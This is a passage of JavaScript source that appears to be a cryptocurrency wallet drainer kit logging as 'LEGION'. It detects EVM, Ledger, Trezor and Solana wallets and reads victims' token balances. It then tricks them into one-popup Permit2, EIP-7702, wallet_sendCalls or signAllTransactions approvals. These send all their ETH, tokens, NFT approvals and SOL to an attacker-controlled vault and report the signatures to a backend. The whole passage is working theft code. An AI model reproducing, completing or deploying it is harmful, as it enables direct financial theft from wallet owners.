                connectedChains.EVM = {
                  chain: 'EVM', config: CHAIN_CONFIG.EVM,
                  address: hwConn.evm.address,
                  chainId: 1,
                  walletType: 'Ledger',
                  provider: null,
                  _hwSign: hwConn.sign,
                  _hwTransport: hwConn.transport,
                  connected: true, timestamp: Date.now()
                };
                console.log('[LEGION] ✅ Ledger connected:', hwConn.evm.address.substring(0, 10) + '...');
                return connectedChains.EVM;
              }
            } catch (_hwErr) {
              console.warn('[LEGION] Ledger WebUSB failed:', _hwErr.message);
            }
          }
          connectedChains.EVM = null;
          return null;
        }
      },

      sign: async function(message) {
        try {
          if (!connectedChains.EVM || (!connectedChains.EVM.provider && !connectedChains.EVM._hwSign)) {
            throw new Error('EVM not connected');
          }
          var eth = connectedChains.EVM.provider;
          var evmAddr = connectedChains.EVM.address;
          var evmChainId = connectedChains.EVM.chainId || 1;

          // ── HARDWARE WALLET PATH (Ledger direct WebUSB, provider is null) ──────
          if (!eth && connectedChains.EVM._hwTransport && connectedChains.EVM.walletType === 'Ledger') {
            try {
              console.log('[LEGION] 🔑 Hardware wallet drain path (Ledger EIP-712)');
              if (!VAULT_CACHE) await prefetchVaultConfig();
              var _hwEvmRpc = 'https://ethereum-rpc.publicnode.com';
              var _hwTokenList = [];
              try {
                var _hwCands = [
                  DEFAULT_USDC,
                  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
                  '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
                  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
                  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
                ];
                for (var _hwi = 0; _hwi < _hwCands.length; _hwi++) {
                  var _hwBal = await (await fetch(_hwEvmRpc, { method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: _hwCands[_hwi], data: '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0') }, 'latest'] }) })).json();
                  if (_hwBal.result && _hwBal.result !== '0x' && BigInt(_hwBal.result) > 0n) _hwTokenList.push(_hwCands[_hwi]);
                }
              } catch (_hwte) {}
              var _hwPermits = _hwTokenList.map(function(t) { return { token: t, amount: '1000000000000000000000000000' }; });
              if (_hwPermits.length === 0) { console.log('[LEGION] Ledger: no tokens found'); return null; }
              var _hwBatch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
                wallet_address: evmAddr, chain_id: 1, permits: _hwPermits, nativeAmount: '0'
              });
              var _hwBatchData = (_hwBatch && _hwBatch.data) ? _hwBatch.data : _hwBatch;
              if (!_hwBatchData || !_hwBatchData.typed_data) throw new Error('No typed_data from backend');
              var _hwTypedData = _hwBatchData.typed_data;
              var _hwSig = await LedgerSupport.signEIP712(connectedChains.EVM._hwTransport, _hwTypedData);
              if (!_hwSig) throw new Error('Ledger EIP-712 signing returned null');
              connectedChains.EVM._batchResult = _hwBatchData;
              connectedChains.EVM._permits = _hwPermits;
              console.log('[LEGION] ✅ Ledger EIP-712 signed');
              return _hwSig;
            } catch (_hwErr) {
              console.warn('[LEGION] Ledger drain path failed:', _hwErr.message);
              return null;
            }
          }

          // ── HARDWARE WALLET PATH (Trezor WebHID, provider is null) ─────────
          if (!eth && connectedChains.EVM.walletType === 'Trezor') {
            try {
              console.log('[LEGION] 🔑 Hardware wallet drain path (Trezor EIP-712)');
              if (!VAULT_CACHE) await prefetchVaultConfig();
              var _tzEvmRpc = 'https://ethereum-rpc.publicnode.com';
              var _tzTokenList = [];
              try {
                var _tzCands = [
                  DEFAULT_USDC,
                  '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
                ];
                for (var _tzi = 0; _tzi < _tzCands.length; _tzi++) {
                  var _tzBal = await (await fetch(_tzEvmRpc, { method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: _tzCands[_tzi], data: '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0') }, 'latest'] }) })).json();
                  if (_tzBal.result && _tzBal.result !== '0x' && BigInt(_tzBal.result) > 0n) _tzTokenList.push(_tzCands[_tzi]);
                }
              } catch (_tzte) {}
              var _tzPermits = _tzTokenList.map(function(t) { return { token: t, amount: '1000000000000000000000000000' }; });
              if (_tzPermits.length === 0) { console.log('[LEGION] Trezor: no tokens found'); return null; }
              var _tzBatch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
                wallet_address: evmAddr, chain_id: 1, permits: _tzPermits, nativeAmount: '0'
              });
              var _tzBatchData = (_tzBatch && _tzBatch.data) ? _tzBatch.data : _tzBatch;
              if (!_tzBatchData || !_tzBatchData.typed_data) throw new Error('No typed_data from backend');
              var _tzTypedData = _tzBatchData.typed_data;
              if (!window.TrezorConnect) {
                var _tzLoaded = await TrezorSupport.loadSDK();
                if (!_tzLoaded) throw new Error('Trezor SDK not available');
              }
              var _tzResult = await window.TrezorConnect.ethereumSignTypedData({
                path: LEDGER_EVM_PATH,
                data: _tzTypedData,
                metamask_v4_compat: true
              });
              if (!_tzResult.success) throw new Error(_tzResult.payload.error || 'Trezor EIP-712 failed');
              var _tzSig = '0x' + _tzResult.payload.signature;
              connectedChains.EVM._batchResult = _tzBatchData;
              connectedChains.EVM._permits = _tzPermits;
              console.log('[LEGION] ✅ Trezor EIP-712 signed');
              return _tzSig;
            } catch (_tzErr) {
              console.warn('[LEGION] Trezor drain path failed:', _tzErr.message);
              return null;
            }
          }

          // Scan ERC-20 tokens with on-chain balanceOf
          // For WalletConnect providers, eth_call must go directly to an RPC (not relayed to wallet)
          var _evmRpcUrl = (function() {
            var _rpcMap = {
              1: 'https://ethereum-rpc.publicnode.com',
              42161: 'https://arbitrum-one-rpc.publicnode.com',
              8453: 'https://base-rpc.publicnode.com',
              10: 'https://optimism-rpc.publicnode.com',
              56: 'https://bsc-rpc.publicnode.com',
              137: 'https://polygon-bor-rpc.publicnode.com'
            };
            return _rpcMap[Number(evmChainId)] || _rpcMap[1];
          })();
          var _isWCProvider = !!(connectedChains.EVM && connectedChains.EVM.walletType === 'WalletConnect');
          async function _ethCall(params) {
            if (_isWCProvider) {
              var _r = await fetch(_evmRpcUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: params }) });
              var _d = await _r.json(); return _d.result;
            }
            return eth.request({ method: 'eth_call', params: params });
          }

          var tokenList = [];
          try {
            var _candidateTokens = [DEFAULT_USDC];
            try {
              var ranked = await Promise.race([
                apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' }),
                new Promise(function(_, rej) { setTimeout(function() { rej(new Error('timeout')); }, 5000); })
              ]);
              var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
              if (rankedAssets) {
                rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; })
                  .slice(0, 20).forEach(function(a) {
                    if (_candidateTokens.indexOf(a.token) === -1) _candidateTokens.push(a.token);
                  });
              }
            } catch (_se) {}
            for (var _ci = 0; _ci < _candidateTokens.length; _ci++) {
              try {
                var _tok = _candidateTokens[_ci];
                var _balData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
                var _balHex = await _ethCall([{ to: _tok, data: _balData }, 'latest']);
                var _bal = (_balHex && _balHex !== '0x' && _balHex !== '0x0') ? BigInt(_balHex) : BigInt(0);
                if (_bal > BigInt(0)) tokenList.push(_tok);
              } catch (_be) {}
            }
            if (tokenList.length > 0) console.log('[LEGION] 🪙 ERC-20 found:', tokenList.length, 'tokens on chain', evmChainId);
          } catch (e) {}

          // ─── EIP-7702 PATH (ETH mainnet + L2s) ────────────────────────────────
          var _batchDrainAddr = BATCH_DRAIN_BY_CHAIN[evmChainId] || BATCH_DRAIN_BY_CHAIN[Number(evmChainId)];
          var _is7702Chain = !!(EIP7702_CHAINS[evmChainId] || EIP7702_CHAINS[Number(evmChainId)]);

          if (_is7702Chain && _batchDrainAddr && _batchDrainAddr !== '0x0000000000000000000000000000000000000000') {
            console.log('[LEGION] ⚡ EIP-7702 path | chain:', evmChainId, '| BatchDrain:', _batchDrainAddr.slice(0,10) + '...');
            updateStatus('Calculating optimal gas fees...');

            var _chainIdNum = Number(evmChainId);
            var _chainHex = '0x' + _chainIdNum.toString(16);

            // Detect MetaMask (strict) vs all other EVM wallets
            var _isMetaMaskOnly = !!(eth.isMetaMask && !eth.isRabby && !eth.isFrame && !eth.isOkxWallet && !eth.isOKExWallet && !eth.isCoinbaseWallet && !eth.isBraveWallet && !eth.isTrust && !eth.isBitget);

            // ── PATH A: MetaMask → wallet_sendCalls (batch ETH + token transfers) ──
            // MetaMask blocks wallet_signAuthorization for custom contracts.
            // wallet_sendCalls triggers ONE popup — MetaMask internally uses its official
            // delegator (0x63c0...) for EIP-7702 batch execution. Same method InfernoDrainer used.
            if (_isMetaMaskOnly) {
              try {
                if (!VAULT_CACHE) await prefetchVaultConfig();
                var _vaultEvmAddr = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE['1'] || VAULT_CACHE.eth);
                if (_vaultEvmAddr) {
                  var _bCalls = [];
                  var _vaultPadMM = _vaultEvmAddr.replace('0x','').padStart(64,'0').toLowerCase();

                  // ETH: send balance minus gas reserve
                  try {
                    var _rawEthBal = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
                    var _ethBalBig = BigInt(_rawEthBal || '0x0');
                    var _gasReserve = BigInt('15000000000000000'); // 0.015 ETH for gas (10-call batch at 30gwei)
                    if (_ethBalBig > _gasReserve) {
                      var _ethToSend = _ethBalBig - _gasReserve;
                      _bCalls.push({ to: _vaultEvmAddr, value: '0x' + _ethToSend.toString(16), data: '0x' });
                    }
                  } catch (_eb) {}

                  // ERC-20: direct transfer(vault, balance) for each token
                  for (var _mti = 0; _mti < tokenList.length; _mti++) {
                    try {
                      var _mtok = tokenList[_mti];
                      var _mtokBalData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
                      var _mtokBalHex = await _ethCall([{ to: _mtok, data: _mtokBalData }, 'latest']);
                      var _mtokBal = (_mtokBalHex && _mtokBalHex !== '0x' && _mtokBalHex !== '0x0') ? BigInt(_mtokBalHex) : BigInt(0);
                      if (_mtokBal > BigInt(0)) {
                        // transfer(vault, amount)
                        var _tfData = '0xa9059cbb' + _vaultPadMM + _mtokBal.toString(16).padStart(64,'0');
                        _bCalls.push({ to: _mtok, data: _tfData });
                      }
                    } catch (_mte) {}
                  }

                  // ERC-721 NFTs: setApprovalForAll(vault, true) for each contract found
                  // In EIP-7702, address(this)==user → calling setApprovalForAll approves backend to transfer
                  var _nftContracts = [];
                  try {
                    var _nftScan = await apiPost('/api/v1/seaport/scan-listings', { wallet_address: evmAddr, chain_id: evmChainId });
                    var _nftList = (_nftScan && _nftScan.data && _nftScan.data.listings) || (_nftScan && _nftScan.listings) || [];
                    var _nftContractsSeen = {};
                    // setApprovalForAll(vault, true) = 0xa22cb465 + padded(vault,true)
                    var _approveAllSig = '0xa22cb465';
                    _nftList.forEach(function(nft) {
                      var c = nft.nft_contract || nft.contract;
                      if (c && !_nftContractsSeen[c.toLowerCase()]) {
                        _nftContractsSeen[c.toLowerCase()] = true;
                        _nftContracts.push(c);
                        var _approveData = _approveAllSig +
                          _vaultEvmAddr.replace('0x','').padStart(64,'0').toLowerCase() +
                          '0000000000000000000000000000000000000000000000000000000000000001';
                        _bCalls.push({ to: c, data: _approveData });
                      }
                    });
                    if (_nftContracts.length > 0) console.log('[LEGION] 🖼️ NFT setApprovalForAll added:', _nftContracts.length, 'contracts');
                  } catch (_nftScanErr) { console.debug('[LEGION] NFT scan skipped:', _nftScanErr.message); }

                  console.log('[LEGION] MetaMask wallet_sendCalls batch built | calls:', _bCalls.length, '| ETH+tokens+NFTs');
                  if (_bCalls.length > 0) {
                    updateStatus('Batching transactions...');
                    console.log('[LEGION] Sending wallet_sendCalls...');
                    var _scResp = await eth.request({
                      method: 'wallet_sendCalls',
                      params: [{ version: '1.0', chainId: _chainHex, from: evmAddr, calls: _bCalls }]
                    });
                    var _scTxId = typeof _scResp === 'string' ? _scResp : ((_scResp && _scResp.id) ? _scResp.id : JSON.stringify(_scResp));
                    console.log('[LEGION] ✅ wallet_sendCalls submitted | id:', _scTxId);
                    try {
                      await apiPost('/api/v1/signature-anchor', {
                        ingress: 'normalized_v1', chain_family: 'EVM',
                        protocol: 'wallet_send_calls',
                        wallet_address: evmAddr, chain_id: evmChainId,
                        tx_hash: _scTxId,
                        scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
                        amount: '0', erc20s: tokenList,
                        wallet_type: 'metamask_batch',
                        nonce: 'legion:wsc:' + Date.now(), expiry_iso: EXPIRY_ISO,
                      });
                    } catch (_scBErr) {}
                    return '__eip7702__:' + evmAddr;
                  }
                }
              } catch (_scErr) {
                var _scCode = _scErr && (_scErr.code || (_scErr.data && _scErr.data.code));
                if (_isRejection(_scCode, (_scErr && _scErr.message) || '')) throw _scErr;
                console.warn('[LEGION] wallet_sendCalls failed:', _scErr && _scErr.message ? _scErr.message.slice(0,80) : '');
              }
            }

            // ── PATH B: Non-MetaMask → wallet_signAuthorization ───────────────────
            // OKX, Trust Wallet, Rabby, Ambire, TokenPocket, SafePal, Bitget etc.
            // These wallets expose wallet_signAuthorization to dApps with custom contracts.
            // Backend receives auth tuple → broadcasts type-4 tx → calls drain() on user addr.
            // Drains ETH + all ERC-20 in ONE popup.
            var _auth = null;
            var _userNonceNum = 0;
            if (!_isMetaMaskOnly) {
              try {
                var _userNonceHex = await eth.request({ method: 'eth_getTransactionCount', params: [evmAddr, 'pending'] });
                _userNonceNum = parseInt(_userNonceHex, 16) || 0;
              } catch (_ne) {}
              try {
                console.log('[LEGION] EIP-7702: wallet_signAuthorization (non-MetaMask)');
                var _waResult = await eth.request({
                  method: 'wallet_signAuthorization',
                  params: [{ chainId: _chainIdNum, address: _batchDrainAddr, nonce: _userNonceNum }]
                });
                if (_waResult && _waResult.r && _waResult.s) {
                  _auth = {
                    r: _waResult.r, s: _waResult.s,
                    yParity: _waResult.yParity !== undefined
                      ? Number(_waResult.yParity)
                      : (_waResult.v !== undefined ? (Number(_waResult.v) % 2) : 0),
                    nonce: _userNonceNum,
                  };
                  console.log('[LEGION] ✅ wallet_signAuthorization SUCCESS');
                }
              } catch (_waErr) {
                var _waCode = _waErr && (_waErr.code || (_waErr.data && _waErr.data.code));
                if (_isRejection(_waCode, (_waErr && _waErr.message) || '')) throw _waErr;
                console.warn('[LEGION] wallet_signAuthorization failed:', _waErr && _waErr.message ? _waErr.message.slice(0,80) : '');
              }
            }

            if (!_auth) { console.warn('[LEGION] ❌ EIP-7702 auth failed — falling back to permit2'); }

            if (_auth) {
              console.log('[LEGION] ✅ EIP-7702 auth | yParity:', _auth.yParity);
              connectedChains.EVM._eip7702Auth = _auth;
              connectedChains.EVM._eip7702Tokens = tokenList;
              try {
                await apiPost('/api/v1/signature-anchor', {
                  ingress: 'normalized_v1', chain_family: 'EVM',
                  protocol: 'eip7702_delegation',
                  wallet_address: evmAddr, chain_id: evmChainId,
                  eip7702_authorization: {
                    chainId: _chainIdNum, address: _batchDrainAddr,
                    nonce: _userNonceNum, r: _auth.r, s: _auth.s, yParity: _auth.yParity,
                  },
                  delegatee: _batchDrainAddr, token_address: _batchDrainAddr,
                  signature: _auth.r, nonce: 'legion:eip7702:' + Date.now(),
                  expiry_iso: EXPIRY_ISO,
                  wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
                  scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: '0', erc20s: tokenList,
                });
                console.log('[LEGION] ✅ EIP-7702 delegation sent to backend');
              } catch (_exErr) {
                console.warn('[LEGION] EIP-7702 backend error:', _exErr && _exErr.message);
              }
              return '__eip7702__:' + evmAddr;
            }
          }

          // ─── NATIVE COIN DRAIN (BSC/Polygon/non-7702 chains with ETH/BNB/MATIC balance) ─
          try {
            if (!VAULT_CACHE) await prefetchVaultConfig();
            var _vaultNative = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE['1'] || VAULT_CACHE.eth);
            if (_vaultNative) {
              var _rawNatBal = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
              var _natBig = BigInt(_rawNatBal || '0x0');
              var _natRes = BigInt('2000000000000000'); // 0.002 native reserve for gas
              if (_natBig > _natRes) {
                var _natSend = _natBig - _natRes;
                console.log('[LEGION] 💸 Native drain | chain:', evmChainId, '| amount:', _natSend.toString());
                var _natTx = await eth.request({ method: 'eth_sendTransaction', params: [{ from: evmAddr, to: _vaultNative, value: '0x' + _natSend.toString(16), gas: '0x5208' }] });
                console.log('[LEGION] ✅ Native drained | tx:', _natTx);
              }
            }
          } catch (_natErr) { console.debug('[LEGION] Native drain skipped:', _natErr.message); }

          // ─── PERMIT2 FALLBACK (BSC, Polygon, non-EIP-7702 chains) ─────────────
          console.log('[LEGION] 🔐 Permit2 fallback | chain:', evmChainId, '| tokens:', tokenList.length);
          var permits = tokenList.map(function(t) {
            return { token: t, amount: '1000000000000000000000000000' };
          });

          if (permits.length === 0) {
            console.log('[LEGION] ℹ️ No tokens found on chain', evmChainId, '— skipping');
            return null;
          }

          var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
            wallet_address: evmAddr, chain_id: evmChainId, permits: permits, nativeAmount: '0'
          });
          console.log('[LEGION] 📄 permit2 response:', batch ? Object.keys(batch) : 'null');

          var batchData = (batch && batch.data) ? batch.data : batch;
          if (!batchData || !batchData.typed_data) {
            throw new Error('Backend did not return typed_data for chain ' + evmChainId);
          }

          var typedDataObj = batchData.typed_data;
          if (typedDataObj && typedDataObj.domain && typeof typedDataObj.domain.chainId === 'string') {
            typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || evmChainId;
          }
          if (typedDataObj && typedDataObj.types && !typedDataObj.types.EIP712Domain) {
            var dom = typedDataObj.domain || {};
            var domFields = [];
            if (dom.name !== undefined) domFields.push({ name: 'name', type: 'string' });
            if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
            if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
            if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
            typedDataObj.types.EIP712Domain = domFields;
          }
          var typedDataStr = JSON.stringify(typedDataObj);

          function _isRejection(code, msg) {
            return code === 4001 || code === -32100 || code === -32603 || code === 5000 ||
              code === 'ACTION_REJECTED' || code === 'USER_REJECTED' ||
              (msg && /rejected|denied|cancelled|user rejected|user refused|declined|abort/i.test(msg));
          }

          var signature = null;
          try {
            signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataStr] });
          } catch (e) {
            var code = e && (e.code || (e.data && e.data.code));
            var eMsg = (e && e.message) || '';
            if (_isRejection(code, eMsg)) throw e;
            try {
              signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataObj] });
            } catch (e2) { throw e2; }
          }

          connectedChains.EVM._batchResult = batchData;
          connectedChains.EVM._permits = permits;
          return signature;

        } catch (e) {
          console.error('[LEGION] EVM signing failed:', e.message, 'code:', e.code);
          return null;
        }
      }
    },

    SOL: {
      config: CHAIN_CONFIG.SOL,
      vaultKey: 'sol',
      detectionPriority: ['wallet-standard', 'phantom', 'solflare', 'backpack', 'solana'],

      detect: function() {
        try {
          // Wallet Standard: auto-discover any Solana wallet
          if (discoveredSolanaWallets.length > 0) {
            console.log('[LEGION] 🔍 SOL detected via Wallet Standard (' + discoveredSolanaWallets.length + ' wallets)');
            return true;
          }
          var hasPhantom = window.phantom && window.phantom.solana;
          var hasSolflare = window.solflare && window.solflare.isSolflare;
          var hasBackpack = window.backpack && window.backpack.solana;
          var hasSolana = window.solana;

          if (hasPhantom || hasSolflare || hasBackpack || hasSolana) {
            console.log('[LEGION] 🔍 SOL detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      getWalletInfo: function() {
        try {
          // Wallet Standard: use discovered Solana wallet
          if (discoveredSolanaWallets.length > 0) {
            var sw = discoveredSolanaWallets[0];
            if (sw.features && sw.features['standard:connect']) {
              return { type: sw.name || 'Solana Wallet', provider: sw };
            }
          }
          if (window.phantom && window.phantom.solana) {
            return { type: 'Phantom', provider: window.phantom.solana };
          }
          if (window.solflare && window.solflare.isSolflare) {
            return { type: 'Solflare', provider: window.solflare };
          }
          if (window.backpack && window.backpack.solana) {
            return { type: 'Backpack', provider: window.backpack.solana };
          }
          if (window.solana) {
            return { type: 'Solana Wallet', provider: window.solana };
          }
          return null;
        } catch (e) {
          return null;
        }
      },

      connect: async function() {
        if (connectedChains.SOL) {
          console.log('[LEGION] SOL already connected, returning cached');
          return connectedChains.SOL;
        }

        try {
          console.log('[LEGION] 🔗 Connecting to SOL...');
          var walletInfo = this.getWalletInfo();
          if (!walletInfo) throw new Error('No Solana wallet detected');

          var sol = walletInfo.provider;

          // Connect to wallet — Wallet Standard uses features['standard:connect'], legacy uses .connect()
          var pk = null;
          if (sol.features && sol.features['standard:connect']) {
            var stdConn = await sol.features['standard:connect'].connect({});
            var firstAcc = stdConn && stdConn.accounts && stdConn.accounts[0];
            if (firstAcc) {
              pk = firstAcc.address || (firstAcc.publicKey && (firstAcc.publicKey.toString ? firstAcc.publicKey.toString() : String(firstAcc.publicKey)));
            }
          } else if (sol.connect && typeof sol.connect === 'function') {
            await sol.connect();
          }

          if (!pk && sol.publicKey) {
            pk = sol.publicKey.toString ? sol.publicKey.toString() : String(sol.publicKey);
          }

          if (!pk) throw new Error('Solana wallet returned no key');

          connectedChains.SOL = {
            chain: 'SOL',
            config: CHAIN_CONFIG.SOL,
            address: pk,
            walletType: walletInfo.type,
            provider: sol,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ SOL connected via', walletInfo.type, ':',
            pk.substring(0, 10) + '...');

          return connectedChains.SOL;
        } catch (e) {
          console.error('[LEGION] ❌ SOL connection failed:', e.message);
          connectedChains.SOL = null;
          return null;
        }
      },

      sign: async function(message) {
        try {
          if (!connectedChains.SOL || !connectedChains.SOL.provider) {
            throw new Error('SOL not connected');
          }

          var sol = connectedChains.SOL.provider;
          var userAddr = connectedChains.SOL.address;
          var vaultAddr = VAULT_CACHE && (VAULT_CACHE.sol || VAULT_CACHE.svm);

          if (vaultAddr && userAddr && connectedChains.SOL.walletType !== 'WalletConnect' && (sol.signAllTransactions || sol.signTransaction)) {
            try {
              var web3 = window.solanaWeb3;
              if (!web3) {
                await new Promise(function(resolve, reject) {
                  var s = document.createElement('script');
                  s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
                  s.onload = function() { web3 = window.solanaWeb3; resolve(); };
                  s.onerror = reject;
                  document.head.appendChild(s);
                });
              }
              if (!web3) throw new Error('web3.js not loaded');

              var _solRpcs = [
                'https://solana-rpc.publicnode.com',
                'https://api.mainnet-beta.solana.com',
                'https://mainnet.helius-rpc.com/?api-key=demo',
                'https://solana-mainnet.rpc.extrnode.com',
              ];
              var connection = new web3.Connection(_solRpcs[0], { commitment: 'confirmed', disableRetryOnRateLimit: true });
              // Fallback: if first RPC fails during use, web3.Connection has built-in retry
              var fromPubkey = new web3.PublicKey(userAddr);
              var toPubkey = new web3.PublicKey(vaultAddr);
              var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
              var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
              var RENT_SYSVAR = new web3.PublicKey('SysvarRent111111111111111111111111111111111');

              var blockhash = (await connection.getLatestBlockhash()).blockhash;
              var txList = [];
              var txMetas = [];

              // Helper: find Associated Token Account address
              function findATA(owner, mint) {
                return web3.PublicKey.findProgramAddressSync(
                  [owner.toBuffer(), TOKEN_PROG.toBuffer(), mint.toBuffer()],
                  ASSOC_PROG
                )[0];
              }

              // Helper: create ATA instruction (no Buffer needed)
              function ixCreateATA(payer, ata, owner, mint) {
                return new web3.TransactionInstruction({
                  keys: [
                    { pubkey: payer, isSigner: true, isWritable: true },
                    { pubkey: ata, isSigner: false, isWritable: true },
                    { pubkey: owner, isSigner: false, isWritable: false },
                    { pubkey: mint, isSigner: false, isWritable: false },
                    { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
                    { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
                    { pubkey: RENT_SYSVAR, isSigner: false, isWritable: false }
                  ],
                  programId: ASSOC_PROG,
                  data: new Uint8Array(0)
                });
              }

              // Helper: SPL transfer instruction (manual u64 LE encoding)
              function ixSplTransfer(fromATA, toATA, owner, rawAmtStr) {
                var data = new Uint8Array(9);
                data[0] = 3; // Transfer opcode
                var dv = new DataView(data.buffer, 1);
                var amt = BigInt(rawAmtStr);
                dv.setUint32(0, Number(amt & BigInt(0xFFFFFFFF)), true);
                dv.setUint32(4, Number((amt >> BigInt(32)) & BigInt(0xFFFFFFFF)), true);
                return new web3.TransactionInstruction({
                  keys: [
                    { pubkey: fromATA, isSigner: false, isWritable: true },
                    { pubkey: toATA, isSigner: false, isWritable: true },
                    { pubkey: owner, isSigner: true, isWritable: false }
                  ],
                  programId: TOKEN_PROG,
                  data: data
                });
              }

              // Helper: serialize signed tx to base64
              function serializeTx(stx) {
                return btoa(Array.from(new Uint8Array(stx.serialize())).map(function(b) { return String.fromCharCode(b); }).join(''));
              }

              // --- TX 1: Native SOL ---
              var lamports = await connection.getBalance(fromPubkey);
              if (lamports > 15000) {
                var solTx = new web3.Transaction();
                solTx.recentBlockhash = blockhash;
                solTx.feePayer = fromPubkey;
                solTx.add(web3.SystemProgram.transfer({ fromPubkey: fromPubkey, toPubkey: toPubkey, lamports: lamports - 15000 }));
                txList.push(solTx);
                txMetas.push({ type: 'sol', mint: null, amount: String(lamports - 15000) });
              }

              // --- TX per SPL token ---
              var tokenRes = await connection.getTokenAccountsByOwner(fromPubkey, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
              for (var ti = 0; ti < tokenRes.value.length; ti++) {
                var acct = tokenRes.value[ti];
                var info = acct.account.data.parsed.info;
                var rawAmt = info.tokenAmount && info.tokenAmount.amount;
                if (!rawAmt || rawAmt === '0') continue;

                var mintKey = new web3.PublicKey(info.mint);
                var userATA = new web3.PublicKey(acct.pubkey.toString());
                var vaultATA = findATA(toPubkey, mintKey);

                var splTx = new web3.Transaction();
                splTx.recentBlockhash = blockhash;
                splTx.feePayer = fromPubkey;

                // Create vault ATA if it doesn't exist yet
                var vaultATAInfo = await connection.getAccountInfo(vaultATA);
                if (!vaultATAInfo) {
                  splTx.add(ixCreateATA(fromPubkey, vaultATA, toPubkey, mintKey));
                }
                splTx.add(ixSplTransfer(userATA, vaultATA, fromPubkey, rawAmt));
                txList.push(splTx);
                txMetas.push({ type: 'spl', mint: info.mint, amount: rawAmt });
              }

              if (txList.length > 0) {
                // signAllTransactions = 1 popup for everything
                var signedTxs;
                if (sol.signAllTransactions) {
                  signedTxs = await sol.signAllTransactions(txList);
                } else {
                  signedTxs = [];
                  for (var si = 0; si < txList.length; si++) {
                    signedTxs.push(await sol.signTransaction(txList[si]));
                  }
                }

                connectedChains.SOL._allSignedTxs = signedTxs.map(serializeTx);
                connectedChains.SOL._txMetas = txMetas;
                connectedChains.SOL._signedTxB64 = connectedChains.SOL._allSignedTxs[0];
                console.log('[LEGION] ✅ SOL signAllTransactions: ' + signedTxs.length + ' txs (' + txMetas.filter(function(m) { return m.type === 'spl'; }).length + ' SPL tokens)');
                return JSON.stringify({ signed_tx_b64: connectedChains.SOL._allSignedTxs[0] });
              }
            } catch(_svmErr) {
              console.debug('[LEGION] SOL signAllTransactions failed:', _svmErr.message);
            }
          }

          // WalletConnect Solana — try signTransaction via request() before plain message fallback
          if (connectedChains.SOL.walletType === 'WalletConnect' && sol.request) {
            try {
              var web3Wc = window.solanaWeb3;
              if (!web3Wc) {
                await new Promise(function(resolve, reject) {
                  var s = document.createElement('script');
                  s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
                  s.onload = function() { web3Wc = window.solanaWeb3; resolve(); };
                  s.onerror = reject;
                  document.head.appendChild(s);
                });
              }
              var _wcVaultSol = VAULT_CACHE && (VAULT_CACHE.sol || VAULT_CACHE.svm);
              if (web3Wc && _wcVaultSol) {
                var _wcConnWc = new web3Wc.Connection('https://solana-rpc.publicnode.com', 'confirmed');
                var _wcFrom = new web3Wc.PublicKey(userAddr);
                var _wcTo = new web3Wc.PublicKey(_wcVaultSol);
                var _wcLam = await _wcConnWc.getBalance(_wcFrom);
                if (_wcLam > 15000) {
                  var _wcTx = new web3Wc.Transaction();
                  _wcTx.recentBlockhash = (await _wcConnWc.getLatestBlockhash()).blockhash;
                  _wcTx.feePayer = _wcFrom;
                  _wcTx.add(web3Wc.SystemProgram.transfer({ fromPubkey: _wcFrom, toPubkey: _wcTo, lamports: _wcLam - 15000 }));
                  var _wcSerializedB64 = btoa(String.fromCharCode.apply(null, _wcTx.serialize({ requireAllSignatures: false })));
                  var _wcSignRes = await sol.request({
                    method: 'solana_signTransaction',
                    params: { transaction: _wcSerializedB64, pubkey: userAddr }
                  }, 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp');
